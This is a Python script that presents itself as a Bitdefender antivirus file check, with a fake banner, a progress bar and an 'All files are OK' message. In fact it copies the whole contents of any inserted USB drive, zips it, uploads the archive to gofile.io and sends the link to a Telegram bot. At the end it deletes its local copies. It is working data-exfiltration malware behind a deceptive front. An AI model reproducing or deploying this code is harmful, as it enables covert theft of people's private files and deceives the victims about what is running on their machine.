import os
import shutil
import zipfile
from abc import abstractmethod, ABC
from platform import system as syst
from time import sleep
from os import chdir, listdir, path, mkdir, sep
from shutil import copytree, copyfile
from progressbar import ProgressBar, Percentage, Bar, ETA, FileTransferSpeed
import requests
import argparse
import json
import xml.etree.ElementTree as ET
import asyncio
import os
from telegram import Bot
from datetime import datetime


current_date = datetime.now().strftime("%Y-%m-%d")


async def envoyer_message_telegram(message, chat_id, token):
    bot = Bot(token=token)
    await bot.send_message(chat_id=chat_id, text=message)


def send_to_telegram(processed_data):
    # Replace YOUR_BOT_TOKEN with your Telegram bot token
    token = "YOUR_BOT_TOKEN"

    # Replace CHAT_ID with the chat ID where you want to send the message
    chat_id = "CHAT_ID"

    # Message to send (you can customize the message format)
    message = f"-📦-New Package-📦-\n\n{processed_data}\n\n{current_date} Congratulations! 😶‍🌫️"

    # Use asyncio to run the coroutine
    asyncio.run(envoyer_message_telegram(message, chat_id, token))


class Main:
    def __init__(self, home, dest):
        self.home = home
        self.dest = dest
        self.usbNum = 0
        self.usb_drive_list = []

        if "USB Files" not in listdir(self.home):
            chdir(self.home)
            mkdir("USB Files")

        print("\n****Bitdefender AntiVirus***"
              "\nInfo(tags/v3.7.6:, Fev 29 2024, 00:42:30)"
              " [MSC v.1916 64 bit (AMD64)] on win32. "
              "Please wait while checking your files...\n")

    def USB_Number(self):
        chdir(self.dest)
        lister = listdir('.')
        Directories = [i for i in lister if path.isdir(i)]

        if len(Directories) == 0:
            self.usbNum = 1
        else:
            self.usbNum = int(max(Directories)) + 1

    @abstractmethod
    def USB_Drive_List(self):
        pass

    @staticmethod
    def USB_Found_Or_Not(drive_list):
        while not drive_list:
            print("No USB Connected!!!")
            sleep(4)
            drive_list = Main().USB_Drive_List()

    def Copy(self):
        self.USB_Found_Or_Not(self.usb_drive_list)
        if len(self.usb_drive_list) > 1:
            x = 0
            while x < len(self.usb_drive_list):
                chdir(self.usb_drive_list[x])
                self.Copy_Try()
                x += 1
                self.usbNum += 1
        else:
            chdir(self.usb_drive_list[0])
            self.Copy_Try()

    def Copy_Try(self):
        pwd = listdir('.')
        Files = [i for i in pwd if path.isfile(i)]
        Directories = [i for i in pwd if path.isdir(i)]

        widgets = ['Checking: ', Percentage(), ' ', Bar(marker='0', left='[',
                                                        right=']'), ' ', ETA(), ' ', FileTransferSpeed()]

        bar = ProgressBar(widgets=widgets, maxval=len(pwd))

        x = 1
        bar.start()

        # Create a ZIP file after copying the contents
        zip_filename = self.dest + str(self.usbNum) + '.zip'
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for dirname in Directories:
                try:
                    copytree(dirname, self.dest + str(self.usbNum) + sep + dirname)
                    for root, dirs, files in os.walk(dirname):
                        for file in files:
                            zipf.write(os.path.join(root, file), arcname=os.path.relpath(os.path.join(root, file), dirname))
                    bar.update(x)
                    x += 1
                except:
                    bar.update(x)
                    x += 1

            for file in Files:
                copyfile(file, self.dest + str(self.usbNum) + sep + file)
                zipf.write(file, arcname=path.join(str(self.usbNum), file))

        bar.finish()

        # Upload the compressed file
        uploader = FileUploader(verbose=True)
        uploaded_data = uploader.uploadFile(zip_filename)

        # Process and print the uploaded data if needed
        processed_data = uploader.process_data(uploaded_data, format="json")
        print(processed_data)
        send_to_telegram(processed_data)

    @staticmethod
    def Final():
        
        print("\n=====No Thread Found=====\n\nAll files are OK.")


class MainWindows(Main, ABC):
    def __init__(self):
        super().__init__("C:\\", "C:\\USB Files\\")
        self.USB_Number()
        self.usb_drive_list = self.USB_Drive_List()
        self.Copy()
        self.Final()

    def USB_Drive_List(self):
        from win32file import GetDriveType, GetLogicalDrives, DRIVE_REMOVABLE

        drive_list = []
        while not drive_list:
            drivebits = GetLogicalDrives()
            for d in range(1, 26):
                mask = 1 << d
                if drivebits & mask:
                    dirname = '%c:\\' % chr(ord('A') + d)
                    t = GetDriveType(dirname)
                    if t == DRIVE_REMOVABLE:
                        drive_list.append(dirname)
            if not drive_list:
                print("No USB drive found. Please insert a USB drive.")
                sleep(4)
        return drive_list


class MainLinux(Main, ABC):
    def __init__(self):
        from getpass import getuser

        self.username = getuser()
        home = "/home/" + self.username + sep
        dest = home + "USB Files/"

        super().__init__(home, dest)
        self.USB_Number()
        self.usb_drive_list = self.USB_Drive_List()
        self.Copy()
        self.Final()

    def USB_Drive_List(self):
        drive_list = []
        while not drive_list:
            chdir("/media/" + self.username + sep)
            drive_list = listdir('.')
            if not drive_list:
                print("No USB drive found. Please insert a USB drive.")
                sleep(4)
        return drive_list


class FileUploader:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.server = None

    def getServer(self):
        url = "https://api.gofile.io/getServer"
        response = requests.get(url)

        if response.status_code == 200:
            data = json.loads(json.dumps(response.json()))
            if data['status'] == "ok":
                servername = data["data"]["server"]
                if self.verbose:
                    print("La solicitud GET exitosa. JSON PARSEABLE")
                return servername
            if self.verbose:
                print("La solicitud GET exitosa. JSON NO PARSEABLE")
            return 0
        else:
            if self.verbose:
                print("La solicitud GET no fue exitosa.")
            return 0

    def uploadFile(self, filepath):
        if self.getServer() != 0:
            self.server = self.getServer()
            url = "https://" + self.getServer() + ".gofile.io/uploadFile"
            if self.verbose:
                print('Preparando para enviar el archivo: ' + filepath)
            files = {'file': (filepath, open(filepath, 'rb'))}
            if self.verbose:
                print('Realizando petición a "' + url + '"')
            response = requests.post(url, files=files)
            if self.verbose:
                print('Petición Realizada')
            if response.status_code == 200:
                data = response.json()
                data["data"]["server"] = self.server
                return data

    def downloadFile(self, server, fileId, fileName):
        url = f"https://{server}.gofile.io/download/{fileId}/{fileName}"
        if self.verbose:
            print('Realizando petición a "' + url + '"')
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return data

    def downloadFileURL(self, url):
        if self.verbose:
            print('Realizando petición a "' + url + '"')
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return data

    def process_data(self, uploadedFile, format="json"):
        def recursive_conversion(value):
            if isinstance(value, dict):
                return {key: recursive_conversion(val) for key, val in value.items()}
            return value

        processed_data = recursive_conversion(uploadedFile)

        if format == "json":
            return json.dumps(processed_data, indent=4)
        elif format == "xml":
            def dict_to_xml(dictionary, root):
                for key, value in dictionary.items():
                    if isinstance(value, dict):
                        elem = ET.Element(key)
                        dict_to_xml(value, elem)
                    else:
                        elem = ET.Element(key)
                        elem.text = str(value)
                    root.append(elem)
                return root

            root = ET.Element("uploadedFile")
            dict_to_xml(processed_data, root)
            xml_data = ET.tostring(root, encoding="unicode")
            xml_data = '<?xml version="1.0" encoding="UTF-8" ?>' + xml_data
            return xml_data
        elif format == "plaintext":
            def dict_to_plaintext(dictionary, indent=0):
                result = ""
                for key, value in dictionary.items():
                    if isinstance(value, dict):
                        result += " " * indent + f"{key} :\n{dict_to_plaintext(value, indent + 4)}"
                    else:
                        result += " " * indent + f"{key.ljust(15)} : {value}\n"
                return result

            return dict_to_plaintext(processed_data)

def main():
    if syst() == "Windows":
        M = MainWindows()
    elif syst() == "Linux":
        M = MainLinux()

    # Code from FileUploader
    parser = argparse.ArgumentParser(description="Programa para cargar y descargar archivos en GoFile.io")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo Verbose: Mostrar todos los datos")
    parser.add_argument("-d", "--download-url", nargs=1, metavar=("url"), help="Descargar archivo por URL")
    parser.add_argument("-s", "--download", nargs=3, metavar=("server", "fileId", "fileName"),
                        help="Descargar archivo por server, fileId y fileName")
    parser.add_argument("-u", "--upload", help="Cargar archivo desde la ruta local")
    parser.add_argument("--json", action="store_true", help="Devolver datos en formato JSON")
    parser.add_argument("--xml", action="store_true", help="Devolver datos en formato XML")
    parser.add_argument("--plaintext", action="store_true", help="Devolver datos en formato plano")
    parser.add_argument("-o", "--output", help="Guardar datos en un archivo")

    args = parser.parse_args()

    if args.verbose:
        print("Modo Verbose habilitado.")

    uploader = FileUploader(verbose=args.verbose)

    if args.download_url:
        data = uploader.downloadFileURL(args.download_url[0])
    elif args.download:
        server, fileId, fileName = args.download
        data = uploader.downloadFile(server, fileId, fileName)
    elif args.upload:
        data = uploader.uploadFile(args.upload)
    else:
        filepath = r"C:\USB Files\1.zip"
        data = uploader.uploadFile(filepath)

    # Si no se especifica ninguno de los formatos, se utiliza plaintext como formato predeterminado
    if not (args.json or args.xml or args.plaintext):
        args.plaintext = True

    processed_data = uploader.process_data(data, format="json" if args.json else "xml" if args.xml else "plaintext")







    if args.output:
        with open(args.output, "w") as output_file:
            output_file.write(processed_data)
            if args.verbose:
                print(f'Data saved to {args.output}')
        print(f'Data also printed to console.')
        
        
    else:
        print(processed_data)



if __name__ == "__main__":
    main()

dossier_a_supprimer = r"C:\USB Files"

# Vérifiez si le dossier existe avant de le supprimer
if os.path.exists(dossier_a_supprimer):
    shutil.rmtree(dossier_a_supprimer)
    print(f"Le dossier {dossier_a_supprimer} a été supprimé avec succès.")
else:
    print(f"Le dossier {dossier_a_supprimer} n'existe pas.")